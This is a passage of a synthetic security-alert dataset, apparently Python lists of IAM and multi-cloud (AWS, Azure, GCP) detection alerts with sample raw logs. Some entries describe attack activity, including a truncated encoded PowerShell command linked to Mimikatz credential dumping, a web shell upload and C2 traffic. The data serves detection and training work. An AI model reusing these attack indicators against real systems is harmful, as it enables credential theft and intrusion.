        "tags": ["privileged-account", "password-reset", "compromised-account"],
        "severity": "Critical",
        "reference": "Admin account k.smith password reset at unusual time",
        "description": "Password for admin account k.smith reset after hours from non-standard admin workstation IP—possible compromise.",
        "artifact": [
            {"type": "username", "value": "k.smith"},
            {"type": "source_ip", "value": "192.168.10.20"},
            {"type": "time_of_day", "value": "After-hours"}
        ],
        "raw_log": {
            "service": "Active Directory",
            "timestamp": "2025-09-23T23:34:59.000Z",
            "event_type": "PasswordReset",
            "user": {"username": "k.smith"},
            "details": {"action_by_ip": "192.168.10.20", "action_by_user": "SERVICE_ACCOUNT_PRV"}
        }
    },
    {
        "source": "IAM",
        "rule_id": "IAM-Rule-08-New-User-Accessing-Sensitive-Data",
        "rule_name": "Newly created user accessing sensitive data",
        "alert_date": "2025-09-23T23:40:15Z",
        "tags": ["new-user", "insider-threat", "data-exfiltration"],
        "severity": "Medium",
        "reference": "New user n.jones accessed sensitive data soon after creation",
        "description": "Newly created user n.jones attempted to access file server holding customer PII within 1 hour of creation—outside normal onboarding pattern.",
        "artifact": [
            {"type": "username", "value": "n.jones"},
            {"type": "source_ip", "value": "192.168.2.150"},
            {"type": "resource", "value": "FileServer-HR-PII"}
        ],
        "raw_log": {
            "service": "File Server",
            "timestamp": "2025-09-23T23:40:14.999Z",
            "event_type": "FileAccess",
            "user": {"username": "n.jones"},
            "file_path": "/sensitive/hr/pii/customers.xlsx",
            "access_result": "Denied"
        }
    },
    {
        "source": "IAM",
        "rule_id": "IAM-Rule-09-Service-Account-Interactive-Login",
        "rule_name": "Service account anomalous interactive login",
        "alert_date": "2025-09-23T23:45:30Z",
        "tags": ["service-account", "anomaly", "lateral-movement"],
        "severity": "High",
        "reference": "Service account SVC-APP-01 performed workstation login",
        "description": "Service account 'SVC-APP-01' typically non-interactive logged into workstation interactively—strong indication of compromise.",
        "artifact": [
            {"type": "account_name", "value": "SVC-APP-01"},
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "login_type", "value": "Interactive"}
        ],
        "raw_log": {
            "service": "Active Directory",
            "timestamp": "2025-09-23T23:45:29.876Z",
            "event_type": "LoginSuccess",
            "user": {"username": "SVC-APP-01"},
            "src_ip": "192.168.1.101",
            "login_type": "Interactive"
        }
    },
    {
        "source": "IAM",
        "rule_id": "IAM-Rule-10-Account-Creation-Followed-by-Compromise",
        "rule_name": "New account creation followed by compromise",
        "alert_date": "2025-09-23T23:50:00Z",
        "tags": ["account-compromise", "new-user", "suspicious-activity"],
        "severity": "High",
        "reference": "New account 'temp_admin_user' logged in from unusual IP",
        "description": "Newly created account 'temp_admin_user' first login within 10 minutes from unusual external IP 203.0.113.20—suggests malicious creation and immediate compromise.",
        "artifact": [
            {"type": "username", "value": "temp_admin_user"},
            {"type": "login_ip", "value": "203.0.113.20"},
            {"type": "time_since_creation_min", "value": 10}
        ],
        "raw_log": {
            "service": "Active Directory",
            "timestamp": "2025-09-23T23:50:00.000Z",
            "event_type": "LoginSuccess",
            "user": {"username": "temp_admin_user"},
            "src_ip": "203.0.113.20"
        }
    },
    {
        "source": "IAM",
        "rule_id": "IAM-Rule-11-High-Frequency-Access-Denied",
        "rule_name": "High-frequency access denied events",
        "alert_date": "2025-09-23T23:55:10Z",
        "tags": ["reconnaissance", "lateral-movement", "access-denied"],
        "severity": "Medium",
        "reference": "User a.smith high-frequency denied resource access",
        "description": "User a.smith made rapid repeated access attempts to unauthorized resources—potential reconnaissance for privilege enumeration.",
        "artifact": [
            {"type": "username", "value": "a.smith"},
            {"type": "source_ip", "value": "192.168.2.54"},
            {"type": "denied_attempts", "value": 30},
            {"type": "time_window_sec", "value": 60}
        ],
        "raw_log": {
            "service": "File Server",
            "timestamp": "2025-09-23T23:55:09.123Z",
            "event_type": "AccessDenied",
            "user": {"username": "a.smith"},
            "resource_list": ["/finance/docs/", "/hr/payroll/", "/ceo/private/"],
            "access_result": "Denied"
        }
    },
    {
        "source": "IAM",
        "rule_id": "IAM-Rule-12-Shared-Credential-Used-Unusual-Context",
        "rule_name": "Shared credential anomalous usage",
        "alert_date": "2025-09-24T00:00:20Z",
        "tags": ["shared-account", "anomaly", "lateral-movement"],
        "severity": "Low",
        "reference": "Shared account 'Guest-User' logged in at unusual hour",
        "description": "Shared account 'Guest-User' normally daytime-only logged in at 02:00—possible misuse.",
        "artifact": [
            {"type": "username", "value": "Guest-User"},
            {"type": "source_ip", "value": "192.168.3.88"},
            {"type": "time_of_day", "value": "Unusual-hours"}
        ],
        "raw_log": {
            "service": "Active Directory",
            "timestamp": "2025-09-24T00:00:19.999Z",
            "event_type": "LoginSuccess",
            "user": {"username": "Guest-User"},
            "src_ip": "192.168.3.88"
        }
    },
    {
        "source": "IAM",
        "rule_id": "IAM-Rule-13-Credential-Theft-Attempt-Local-Admin",
        "rule_name": "Local admin credential theft attempt",
        "alert_date": "2025-09-24T00:05:00Z",
        "tags": ["credential-theft", "lateral-movement", "endpoint"],
        "severity": "High",
        "reference": "Local credential dump on host FIN-WKS-JDOE-05",
        "description": "Activity indicative of credential dumping tool (e.g., Mimikatz) detected on FIN-WKS-JDOE-05—attacker may be harvesting admin/domain creds.",
        "artifact": [
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "tool_name", "value": "Mimikatz"}
        ],
        "raw_log": {
            "service": "EDR",
            "timestamp": "2025-09-24T00:04:59.876Z",
            "event_type": "ProcessActivity",
            "src_ip": "192.168.1.101",
            "process_name": "cmd.exe",
            "command_line": "powershell.exe -e JABNAGkAbQBpAGsAYQB0AHoAIAB... "
        }
    },
    {
        "source": "IAM",
        "rule_id": "IAM-Rule-14-Role-Assignment-Anomaly-Cloud",
        "rule_name": "Cloud role assignment anomaly",
        "alert_date": "2025-09-24T00:10:30Z",
        "tags": ["cloud-security", "iam", "role-anomaly"],
        "severity": "High",
        "reference": "User c.jones granted 'IAMFullAccess' role",
        "description": "User c.jones granted AWS 'IAMFullAccess' role (full IAM management) inconsistent with developer role—possible escalation.",
        "artifact": [
            {"type": "username", "value": "c.jones"},
            {"type": "role_granted", "value": "IAMFullAccess"},
            {"type": "platform", "value": "AWS"}
        ],
        "raw_log": {
            "service": "AWS CloudTrail",
            "timestamp": "2025-09-24T00:10:29.999Z",
            "event_name": "AttachUserPolicy",
            "user_identity": {"type": "AssumedRole", "principal_id": "AdminRole"},
            "details": {"user_id": "c.jones", "policy_name": "IAMFullAccess"}
        }
    },
    {
        "source": "IAM",
        "rule_id": "IAM-Rule-15-Account-Lockout-Threshold-Exceeded",
        "rule_name": "Account lockout threshold exceeded",
        "alert_date": "2025-09-24T00:15:15Z",
        "tags": ["authentication", "account-lockout", "brute-force"],
        "severity": "Medium",
        "reference": "Account j.doe locked due to rapid failed logins",
        "description": "Account j.doe hit lockout threshold after multiple failed logins within 5 minutes—possible direct brute force attack.",
        "artifact": [
            {"type": "username", "value": "j.doe"},
            {"type": "failed_logins", "value": 6},
            {"type": "lockout_time", "value": "2025-09-24T00:15:15Z"}
        ],
        "raw_log": {
            "service": "Active Directory",
            "timestamp": "2025-09-24T00:15:14.543Z",
            "event_type": "AccountLockout",
            "user": {"username": "j.doe"},
            "src_ip": "192.168.1.101",
            "details": {"lockout_threshold": 5, "current_failures": 6}
        }
    }
]

cloud_alert = [
    {
        "source": "Cloud",
        "cloud_provider": "AWS",
        "service": "IAM",
        "rule_id": "CLOUD-AWS-IAM-01-Root-User-Activity",
        "rule_name": "Root account activity",
        "alert_date": "2025-09-23T23:05:00Z",
        "tags": ["iam", "privileged-account", "security-best-practice"],
        "severity": "High",
        "reference": "AWS Root account login occurred",
        "description": "AWS Root account logged in from non-designated device—root should remain unused except emergencies per best practices.",
        "artifact": [
            {"type": "account_id", "value": "123456789012"},
            {"type": "user_identity", "value": "Root"},
            {"type": "event_name", "value": "ConsoleLogin"}
        ],
        "raw_log": {
            "platform": "AWS",
            "service": "CloudTrail",
            "timestamp": "2025-09-23T23:04:59.888Z",
            "event_name": "ConsoleLogin",
            "userIdentity": {"type": "Root"},
            "sourceIPAddress": "203.0.113.10",
            "user_agent": "Mozilla/5.0"
        }
    },
    {
        "source": "Cloud",
        "cloud_provider": "Azure",
        "service": "Compute",
        "rule_id": "CLOUD-AZ-COMPUTE-02-VM-Reconnaissance",
        "rule_name": "VM internal reconnaissance",
        "alert_date": "2025-09-23T23:10:30Z",
        "tags": ["compute", "reconnaissance", "lateral-movement"],
        "severity": "Medium",
        "reference": "Azure VM performed internal network scan",
        "description": "Azure VM 'prod-web-01' initiated large-scale port scan of internal virtual network resources—possible compromise.",
        "artifact": [
            {"type": "vm_name", "value": "prod-web-01"},
            {"type": "vm_ip", "value": "10.0.0.4"},
            {"type": "scan_type", "value": "TCP Port Scan"}
        ],
        "raw_log": {
            "platform": "Azure",
            "service": "Network Watcher",
            "timestamp": "2025-09-23T23:10:29.987Z",
            "event_type": "NetworkSecurityGroupFlowEvent",
            "properties": {"src_ip": "10.0.0.4", "dest_ip": "10.0.0.0/24", "dest_port_range": "*", "protocol": "TCP"}
        }
    },
    {
        "source": "Cloud",
        "cloud_provider": "GCP",
        "service": "Storage",
        "rule_id": "CLOUD-GCP-STORAGE-03-Public-Bucket-Access",
        "rule_name": "Publicly accessible storage bucket",
        "alert_date": "2025-09-23T23:15:20Z",
        "tags": ["storage", "misconfiguration", "data-leak"],
        "severity": "High",
        "reference": "GCP bucket configured public",
        "description": "GCP Cloud Storage bucket 'mycorp-customer-data' permissions changed to public—may expose sensitive data.",
        "artifact": [
            {"type": "bucket_name", "value": "mycorp-customer-data"},
            {"type": "permission_change", "value": "publicAccess: True"},
            {"type": "user_identity", "value": "api-service-account"}
        ],
        "raw_log": {
            "platform": "GCP",
            "service": "Cloud Audit Logs",
            "timestamp": "2025-09-23T23:15:19.444Z",
            "methodName": "storage.buckets.setIamPolicy",
            "principalEmail": "api-service-account@mycorp.iam.gserviceaccount.com",
            "resource": {"type": "storage_bucket", "name": "mycorp-customer-data"}
        }
    },
    {
        "source": "Cloud",
        "cloud_provider": "AWS",
        "service": "EC2",
        "rule_id": "CLOUD-AWS-EC2-04-Instance-Stop-Anomaly",
        "rule_name": "EC2 instance anomalous stop",
        "alert_date": "2025-09-23T23:20:55Z",
        "tags": ["compute", "availability", "compromised-account"],
        "severity": "Medium",
        "reference": "EC2 instance 'web-server-02' stopped anomalously",
        "description": "EC2 instance 'web-server-02' stopped after hours by unusual IAM role—possible account compromise.",
        "artifact": [
            {"type": "instance_id", "value": "i-0a1b2c3d4e5f6a7b8"},
            {"type": "instance_name", "value": "web-server-02"},
            {"type": "event_name", "value": "StopInstances"}
        ],
        "raw_log": {
            "platform": "AWS",
            "service": "CloudTrail",
            "timestamp": "2025-09-23T23:20:54.666Z",
            "event_name": "StopInstances",
            "userIdentity": {"type": "AssumedRole", "principalId": "AROAIEXAMPLEID:developer-role"},
            "requestParameters": {"instancesSet": {"items": [{"instanceId": "i-0a1b2c3d4e5f6a7b8"}]}}
        }
    },
    {
        "source": "Cloud",
        "cloud_provider": "Azure",
        "service": "IAM",
        "rule_id": "CLOUD-AZ-IAM-05-High-Risk-User-Login",
        "rule_name": "High-risk user login",
        "alert_date": "2025-09-23T23:25:40Z",
        "tags": ["iam", "risky-user", "compromised-account"],
        "severity": "High",
        "reference": "Azure AD user 'j.doe' flagged high risk",
        "description": "Azure AD flagged user 'j.doe' login as high risk (anonymous IP / impossible travel)—possible compromise.",
        "artifact": [
            {"type": "user_id", "value": "j.doe@mycorp.com"},
            {"type": "risk_state", "value": "High"},
            {"type": "risk_detection", "value": "Anonymous IP address"}
        ],
        "raw_log": {
            "platform": "Azure",
            "service": "Azure AD Identity Protection",
            "timestamp": "2025-09-23T23:25:39.999Z",
            "eventName": "RiskDetected",
            "properties": {"userPrincipalName": "j.doe@mycorp.com", "riskLevel": "High", "riskDetectionType": "Anonymous IP address"}
        }
    },
    {
        "source": "Cloud",
        "cloud_provider": "GCP",
        "service": "Network",
        "rule_id": "CLOUD-GCP-NET-06-Firewall-Rule-Modified",
        "rule_name": "Firewall rule anomalously modified",
        "alert_date": "2025-09-23T23:30:10Z",
        "tags": ["networking", "misconfiguration", "access-control"],
        "severity": "High",
        "reference": "GCP firewall rule opened to all",
        "description": "GCP firewall rule 'allow-all-inbound' modified to allow inbound from all IPs—may create intrusion path.",
        "artifact": [
            {"type": "rule_name", "value": "allow-all-inbound"},
            {"type": "source_ip", "value": "0.0.0.0/0"},
            {"type": "user_identity", "value": "user@mycorp.com"}
        ],
        "raw_log": {
            "platform": "GCP",
            "service": "Cloud Audit Logs",
            "timestamp": "2025-09-23T23:30:09.543Z",
            "methodName": "compute.firewalls.update",
            "principalEmail": "user@mycorp.com",
            "requestJson": {"sourceRanges": ["0.0.0.0/0"]}
        }
    },
    {
        "source": "Cloud",
        "cloud_provider": "AWS",
        "service": "S3",
        "rule_id": "CLOUD-AWS-S3-07-Sensitive-File-Uploaded",
        "rule_name": "Sensitive file uploaded to public bucket",
        "alert_date": "2025-09-23T23:35:00Z",
        "tags": ["storage", "data-leak", "compliance"],
        "severity": "High",
        "reference": "Sensitive CSV file uploaded to S3",
        "description": "File 'customer-pii.csv' uploaded to publicly accessible S3 bucket—may contain PII.",
        "artifact": [
            {"type": "bucket_name", "value": "mycorp-public-data"},
            {"type": "file_name", "value": "customer-pii.csv"},
            {"type": "user_identity", "value": "s.brown"}
        ],
        "raw_log": {
            "platform": "AWS",
            "service": "CloudTrail",
            "timestamp": "2025-09-23T23:34:59.000Z",
            "event_name": "PutObject",
            "userIdentity": {"arn": "arn:aws:iam::123456789012:user/s.brown"},
            "requestParameters": {"bucketName": "mycorp-public-data", "key": "customer-pii.csv"}
        }
    },
    {
        "source": "Cloud",
        "cloud_provider": "Azure",
        "service": "Networking",
        "rule_id": "CLOUD-AZ-NET-08-New-VPN-Gateway-Created",
        "rule_name": "New VPN gateway created",
        "alert_date": "2025-09-23T23:40:15Z",
        "tags": ["networking", "policy-violation", "lateral-movement"],
        "severity": "Medium",
        "reference": "New Azure VPN gateway created",
        "description": "Unknown account 'developer-account' created new Azure VPN gateway linked to internal VNet—potential unauthorized access point.",
        "artifact": [
            {"type": "gateway_name", "value": "malicious-vpn-gw"},
            {"type": "user_identity", "value": "developer-account"}
        ],
        "raw_log": {
            "platform": "Azure",
            "service": "Azure Activity Log",
            "timestamp": "2025-09-23T23:40:14.999Z",
            "event_name": "Create or Update VPN Gateway",
            "caller": "developer-account@mycorp.com",
            "properties": {"resource": "malicious-vpn-gw"}
        }
    },
    {
        "source": "Cloud",
        "cloud_provider": "GCP",
        "service": "IAM",
        "rule_id": "CLOUD-GCP-IAM-09-Service-Account-API-Spike",
        "rule_name": "Service account API call spike",
        "alert_date": "2025-09-23T23:45:30Z",
        "tags": ["iam", "api-call", "anomaly", "compromised-account"],
        "severity": "High",
        "reference": "Service account 'prod-service' API spike",
        "description": "Service account 'prod-service' initiated anomalously high API volume including VM creation—possible compromise.",
        "artifact": [
            {"type": "service_account", "value": "prod-service-account@mycorp.iam.gserviceaccount.com"},
            {"type": "api_calls", "value": "1000+/min"},
            {"type": "unusual_activity", "value": "compute.instances.insert"}
        ],
        "raw_log": {
            "platform": "GCP",
            "service": "Cloud Audit Logs",
            "timestamp": "2025-09-23T23:45:29.876Z",
            "methodName": "compute.instances.insert",
            "principalEmail": "prod-service-account@mycorp.iam.gserviceaccount.com"
        }
    },
    {
        "source": "Cloud",
        "cloud_provider": "AWS",
        "service": "Database",
        "rule_id": "CLOUD-AWS-DB-10-Unusual-RDS-Access",
        "rule_name": "RDS database unusual access",
        "alert_date": "2025-09-23T23:50:00Z",
        "tags": ["database", "data-exfiltration", "access-anomaly"],
        "severity": "High",
        "reference": "RDS instance accessed from unusual IP",
        "description": "AWS RDS instance 'prod-db-01' accessed from previously unseen external IP—possible exfiltration or intrusion sign.",
        "artifact": [
            {"type": "db_instance_id", "value": "database-1"},
            {"type": "source_ip", "value": "104.22.56.78"},
            {"type": "database_type", "value": "MySQL"}
        ],
        "raw_log": {
            "platform": "AWS",
            "service": "CloudTrail",
            "timestamp": "2025-09-23T23:49:59.000Z",
            "event_name": "Connect",
            "requestParameters": {"dbInstanceIdentifier": "database-1"},
            "sourceIPAddress": "104.22.56.78"
        }
    },
    {
        "source": "Cloud",
        "cloud_provider": "Azure",
        "service": "Storage",
        "rule_id": "CLOUD-AZ-STORAGE-11-Blob-Deletion",
        "rule_name": "Blob storage large-scale deletion",
        "alert_date": "2025-09-23T23:55:10Z",
        "tags": ["storage", "data-destruction", "ransomware"],
        "severity": "Critical",
        "reference": "Azure Blob container large-scale deletions",
        "description": "Blob container 'backups' in account 'mycorp-data-storage' saw large-scale deletions rapidly—possible data destruction or ransomware.",
        "artifact": [
            {"type": "account_name", "value": "mycorp-data-storage"},
            {"type": "container_name", "value": "backups"},
            {"type": "user_identity", "value": "compromised-account"}
        ],
        "raw_log": {
            "platform": "Azure",
            "service": "Azure Activity Log",
            "timestamp": "2025-09-23T23:55:09.123Z",
            "eventName": "Microsoft.Storage/storageAccounts/blobServices/containers/delete",
            "caller": "compromised-account@mycorp.com"
        }
    },
    {
        "source": "Cloud",
        "cloud_provider": "GCP",
        "service": "IAM",
        "rule_id": "CLOUD-GCP-IAM-12-High-Risk-Role-Assigned",
        "rule_name": "High-risk role assigned",
        "alert_date": "2025-09-24T00:00:20Z",
        "tags": ["iam", "privilege-escalation", "misconfiguration"],
        "severity": "High",
        "reference": "GCP user granted 'Owner' role",
        "description": "User 'l.smith' granted GCP project 'Owner' role—highest privilege normally restricted to core admins.",
        "artifact": [
            {"type": "user_identity", "value": "l.smith"},
            {"type": "role_granted", "value": "roles/owner"},
            {"type": "project_id", "value": "mycorp-prod-project"}
        ],
        "raw_log": {
            "platform": "GCP",
            "service": "Cloud Audit Logs",
            "timestamp": "2025-09-24T00:00:19.999Z",
            "methodName": "SetIamPolicy",
            "principalEmail": "l.smith@mycorp.com",
            "requestJson": {"bindings": [{"role": "roles/owner"}]}
        }
    },
    {
        "source": "Cloud",
        "cloud_provider": "AWS",
        "service": "Lambda",
        "rule_id": "CLOUD-AWS-LAMBDA-13-Lambda-Inbound-Connection",
        "rule_name": "Lambda function anomalous inbound connection",
        "alert_date": "2025-09-24T00:05:00Z",
        "tags": ["serverless", "reconnaissance", "lateral-movement"],
        "severity": "High",
        "reference": "Lambda function accessed from anomalous IP",
        "description": "Lambda function 'customer-processor-func' invoked from IP not associated with normal triggers—possible exploitation attempt.",
        "artifact": [
            {"type": "lambda_name", "value": "customer-processor-func"},
            {"type": "source_ip", "value": "1.1.1.1"}
        ],
        "raw_log": {
            "platform": "AWS",
            "service": "CloudWatch Logs",
            "timestamp": "2025-09-24T00:04:59.876Z",
            "log_stream": "/aws/lambda/customer-processor-func",
            "log_message": "Request from 1.1.1.1 to Lambda function"
        }
    },
    {
        "source": "Cloud",
        "cloud_provider": "Azure",
        "service": "Database",
        "rule_id": "CLOUD-AZ-DB-14-Large-Query-DB-Anomaly",
        "rule_name": "Database large query anomaly",
        "alert_date": "2025-09-24T00:10:30Z",
        "tags": ["database", "data-exfiltration", "anomaly"],
        "severity": "High",
        "reference": "Azure SQL database anomalous bulk queries",
        "description": "Azure SQL database 'prod-sql-db' received unusually high query volume after hours—possible data exfiltration or reconnaissance.",
        "artifact": [
            {"type": "db_name", "value": "prod-sql-db"},
            {"type": "query_count", "value": "10000+ queries/min"},
            {"type": "user_identity", "value": "app-service-user"}
        ],
        "raw_log": {
            "platform": "Azure",
            "service": "Azure SQL Audit Log",
            "timestamp": "2025-09-24T00:10:29.999Z",
            "statement": "SELECT * FROM [CustomerTable]",
            "client_ip": "10.0.0.5",
            "server_principal_name": "app-service-user"
        }
    },
    {
        "source": "Cloud",
        "cloud_provider": "GCP",
        "service": "Compute",
        "rule_id": "CLOUD-GCP-COMPUTE-15-VM-Outbound-C2-Traffic",
        "rule_name": "VM outbound C2 traffic",
        "alert_date": "2025-09-24T00:15:15Z",
        "tags": ["compute", "c2", "malware", "outbound"],
        "severity": "Critical",
        "reference": "GCP VM communicating with malicious C2 IP",
        "description": "GCP VM 'dev-server' communicating with external IP flagged as C2—VM likely compromised by malware.",
        "artifact": [
            {"type": "vm_name", "value": "dev-server"},
            {"type": "vm_ip", "value": "10.0.1.10"},
            {"type": "destination_ip", "value": "185.22.67.123"}
        ],
        "raw_log": {
            "platform": "GCP",
            "service": "Cloud VPC Flow Logs",
            "timestamp": "2025-09-24T00:15:14.543Z",
            "event_type": "NetworkFlow",
            "src_ip": "10.0.1.10",
            "dst_ip": "185.22.67.123",
            "dst_port": 443
        }
    },
    {
        "source": "Cloud",
        "cloud_provider": "AWS",
        "service": "IAM",
        "rule_id": "CLOUD-AWS-IAM-16-Failed-Auth-Spike",
        "rule_name": "Authentication failure spike",
        "alert_date": "2025-09-24T00:20:00Z",
        "tags": ["iam", "brute-force", "account-compromise"],
        "severity": "High",
        "reference": "Brute force attempt against IAM account",
        "description": "High number of failed logins detected on IAM user 'dev-user'—possible password spraying or brute force attack.",
        "artifact": [
            {"type": "user_identity", "value": "dev-user"},
            {"type": "failed_attempts", "value": 50},
            {"type": "source_ip", "value": "203.0.113.50"}
        ],
        "raw_log": {
            "platform": "AWS",
            "service": "CloudTrail",
            "timestamp": "2025-09-24T00:19:59.000Z",
            "event_name": "ConsoleLogin",
            "userIdentity": {"type": "IAMUser", "userName": "dev-user"},
            "responseElements": {"ConsoleLogin": "Failure"}
        }
    },
    {
        "source": "Cloud",
        "cloud_provider": "Azure",
        "service": "App Service",
        "rule_id": "CLOUD-AZ-APPSERV-17-Web-Shell-Detected",
        "rule_name": "WebShell uploaded to App Service",
        "alert_date": "2025-09-24T00:25:30Z",
        "tags": ["web-shell", "post-exploitation", "web-application"],
        "severity": "Critical",
        "reference": "WebShell detected in Azure App Service",
        "description": "File 'shell.aspx' uploaded to Azure App Service 'mycorp-web-app' root—identified as WebShell enabling remote control.",
        "artifact": [
            {"type": "app_name", "value": "mycorp-web-app"},
            {"type": "file_path", "value": "/wwwroot/shell.aspx"},
            {"type": "threat_type", "value": "WebShell"}
        ],
        "raw_log": {
            "platform": "Azure",
            "service": "Azure App Service",
            "timestamp": "2025-09-24T00:25:29.876Z",
            "eventName": "FileUploaded",
            "properties": {"path": "/wwwroot/shell.aspx", "source_ip": "104.22.56.78"}
        }
    },
    {
        "source": "Cloud",
        "cloud_provider": "GCP",
        "service": "Database",
        "rule_id": "CLOUD-GCP-DB-18-DB-Access-from-Unusual-Location",
        "rule_name": "Database accessed from unusual location",
        "alert_date": "2025-09-24T00:30:10Z",
        "tags": ["database", "access-anomaly", "geolocation"],
        "severity": "High",
        "reference": "Cloud SQL instance accessed from unusual geography",
        "description": "GCP Cloud SQL instance 'prod-sql' received connection from non-approved region (e.g., China)—violates geo access policy.",
        "artifact": [
            {"type": "db_instance_id", "value": "prod-sql"},
            {"type": "source_ip", "value": "118.123.45.67"},
            {"type": "source_country", "value": "China"}
        ],
        "raw_log": {
            "platform": "GCP",
            "service": "Cloud SQL",
            "timestamp": "2025-09-24T00:30:09.543Z",
            "event_type": "Connection",
            "client_ip": "118.123.45.67"
        }
    },
    {
        "source": "Cloud",
        "cloud_provider": "AWS",
        "service": "Network",
        "rule_id": "CLOUD-AWS-NET-19-Unauthorized-Security-Group-Change",
        "rule_name": "Unauthorized security group modification",
        "alert_date": "2025-09-24T00:35:55Z",
        "tags": ["networking", "misconfiguration", "access-control"],
        "severity": "High",
        "reference": "AWS security group modified to allow SSH access",
        "description": "AWS security group 'prod-sg' modified to allow SSH (port 22) inbound from all IPs—exposes sensitive services.",
        "artifact": [
            {"type": "security_group", "value": "sg-0a1b2c3d4e5f6a7b8"},
            {"type": "rule_change", "value": "allow port 22 from 0.0.0.0/0"},
            {"type": "user_identity", "value": "dev-user"}
        ],
        "raw_log": {
            "platform": "AWS",
            "service": "CloudTrail",
            "timestamp": "2025-09-24T00:35:54.666Z",
            "event_name": "AuthorizeSecurityGroupIngress",
            "userIdentity": {"userName": "dev-user"},
            "requestParameters": {"securityGroupId": "sg-0a1b2c3d4e5f6a7b8",
                                  "ipPermissions": [{"ipProtocol": "tcp", "fromPort": 22, "toPort": 22, "ipRanges": [{"cidrIp": "0.0.0.0/0"}]}]}
        }
    },
    {
        "source": "Cloud",
        "cloud_provider": "Azure",
        "service": "IAM",
        "rule_id": "CLOUD-AZ-IAM-20-Service-Principal-Creation",
        "rule_name": "Unauthorized service principal creation",
        "alert_date": "2025-09-24T00:40:40Z",
        "tags": ["iam", "persistence", "misconfiguration"],
        "severity": "Medium",
        "reference": "New service principal created in Azure",
        "description": "Unusual user 'guest-user' created new Azure service principal. Service principals are typically for automation; malicious creation can enable persistence.",
        "artifact": [
            {"type": "service_principal_name", "value": "malicious-sp"},
            {"type": "actor", "value": "guest-user@mycorp.com"}
        ],
        "raw_log": {
            "platform": "Azure",
            "service": "Azure AD Audit Log",
            "timestamp": "2025-09-24T00:40:39.111Z",
            "category": "ApplicationManagement",
            "activityDisplayName": "Add service principal",
            "initiatingUser": {"userPrincipalName": "guest-user@mycorp.com"}
        }
    },
    {
        "source": "Cloud",
        "cloud_provider": "GCP",
        "service": "Cloud Functions",
        "rule_id": "CLOUD-GCP-FUNC-21-Func-Outbound-Connection",
        "rule_name": "Cloud Function anomalous outbound connection",
        "alert_date": "2025-09-24T00:45:15Z",
        "tags": ["serverless", "c2", "outbound"],
        "severity": "High",
        "reference": "Cloud Function connected to malicious IP",
        "description": "Cloud Function 'data-processor-func' attempted connection to known malicious IP 198.51.100.25—indicates potential malicious code injection or tampering.",
        "artifact": [
            {"type": "function_name", "value": "data-processor-func"},
            {"type": "destination_ip", "value": "198.51.100.25"}
        ],
        "raw_log": {
            "platform": "GCP",
            "service": "Cloud VPC Flow Logs",
            "timestamp": "2025-09-24T00:45:14.543Z",
            "event_type": "NetworkFlow",
            "src_ip": "10.0.2.5",
            "dst_ip": "198.51.100.25"
        }
    },
    {
        "source": "Cloud",
        "cloud_provider": "AWS",
        "service": "Storage",
        "rule_id": "CLOUD-AWS-STORAGE-22-S3-Bucket-Policy-Change",
        "rule_name": "S3 bucket policy changed",
        "alert_date": "2025-09-24T00:50:00Z",
        "tags": ["storage", "misconfiguration", "data-leak"],
        "severity": "High",
        "reference": "S3 bucket policy changed to permit external access",
        "description": "S3 bucket 'mycorp-public-assets' policy modified to allow unauthenticated external principal 'Everyone' to list objects—violates data protection policy.",
        "artifact": [
            {"type": "bucket_name", "value": "mycorp-public-assets"},
            {"type": "permission_change", "value": "GetObject from Everyone"}
        ],
        "raw_log": {
            "platform": "AWS",
            "service": "CloudTrail",
            "timestamp": "2025-09-24T00:49:59.000Z",
            "event_name": "PutBucketPolicy",
            "requestParameters": {"bucketName": "mycorp-public-assets", "policy": "{\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":\"*\", ...}]}"}
        }
    },
    {
        "source": "Cloud",
        "cloud_provider": "Azure",
        "service": "Key Vault",
        "rule_id": "CLOUD-AZ-KEYVAULT-23-Key-Vault-Excessive-Access",
        "rule_name": "Key Vault anomalous access",
        "alert_date": "2025-09-24T00:55:30Z",
        "tags": ["secret-management", "credential-theft", "lateral-movement"],
        "severity": "High",
        "reference": "Key Vault accessed at high frequency by unusual user",
        "description": "Key Vault 'prod-secrets-kv' received abnormally high-frequency key and certificate access requests from unusual account 'l.smith'.",
        "artifact": [
            {"type": "key_vault_name", "value": "prod-secrets-kv"},
            {"type": "actor", "value": "l.smith@mycorp.com"},
            {"type": "request_count", "value": 500}
        ],
        "raw_log": {
            "platform": "Azure",
            "service": "Azure Key Vault Audit Log",
            "timestamp": "2025-09-24T00:55:29.876Z",
            "operationName": "SecretGet",
            "callerIpAddress": "10.0.0.10",
            "identity": {"userPrincipalName": "l.smith@mycorp.com"}
        }
    },
    {
        "source": "Cloud",
        "cloud_provider": "GCP",
        "service": "Network",
        "rule_id": "CLOUD-GCP-NET-24-VPN-Gateway-Traffic-Spike",
        "rule_name": "VPN gateway traffic spike",
        "alert_date": "2025-09-24T01:00:10Z",
        "tags": ["networking", "data-exfiltration", "anomaly"],
        "severity": "High",
        "reference": "GCP VPN gateway outbound traffic spiked",
        "description": "GCP VPN gateway outbound traffic spiked to abnormal level in short period—may indicate data exfiltration over VPN.",
        "artifact": [
            {"type": "gateway_name", "value": "prod-vpn-gw"},
            {"type": "traffic_direction", "value": "Outbound"},
            {"type": "data_volume_gb", "value": 20}
        ],
        "raw_log": {
            "platform": "GCP",
            "service": "Cloud VPN Monitoring",
            "timestamp": "2025-09-24T01:00:09.543Z",
            "metric": "sent_bytes_per_second",
            "value": 2000000000
        }
    },
    {
        "source": "Cloud",
        "cloud_provider": "AWS",
        "service": "IAM",
        "rule_id": "CLOUD-AWS-IAM-25-Credential-Key-Leak-in-Github",
        "rule_name": "IAM credential leaked on GitHub",
        "alert_date": "2025-09-24T01:05:00Z",
        "tags": ["iam", "credential-leak", "public-exposure"],
        "severity": "Critical",
        "reference": "IAM Access Key discovered on GitHub",
        "description": "AWS Threat Detection detected IAM access key 'AKIAIOSFODNN7EXAMPLE' exposed in public GitHub repository—credential should be revoked immediately.",
        "artifact": [
            {"type": "access_key", "value": "AKIAIOSFODNN7EXAMPLE"},
            {"type": "leak_platform", "value": "GitHub"}
        ],
        "raw_log": {
            "platform": "AWS",
            "service": "GuardDuty",
            "timestamp": "2025-09-24T01:04:59.000Z",
            "finding_type": "CredentialAccess:IAMUser/Exfiltration.S3.CredentialsExposedOnGithub"
        }
    },
    {
        "source": "Cloud",
        "cloud_provider": "Azure",
        "service": "Storage",
        "rule_id": "CLOUD-AZ-STORAGE-26-Sas-Token-Misuse",
